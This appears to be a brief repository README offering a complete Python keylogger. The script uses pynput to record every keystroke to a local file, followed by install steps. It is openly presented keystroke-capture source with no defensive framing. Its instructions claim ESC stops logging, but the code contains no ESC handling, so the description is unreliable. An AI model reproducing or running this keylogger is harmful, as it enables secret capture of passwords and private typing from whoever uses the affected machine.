# Simple-Keylogger
Log File Analysis

from pynput import keyboard

def on_press(key):
    try:
        key_data = str(key.char)
    except AttributeError:
        key_data = str(key)
    with open("keylog.txt", "a") as log:
        log.write(key_data + "\n")

def main():
    print("Keylogger started. Press ESC to stop.")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()


Method 

pip install pynput
ESC to Stop Log
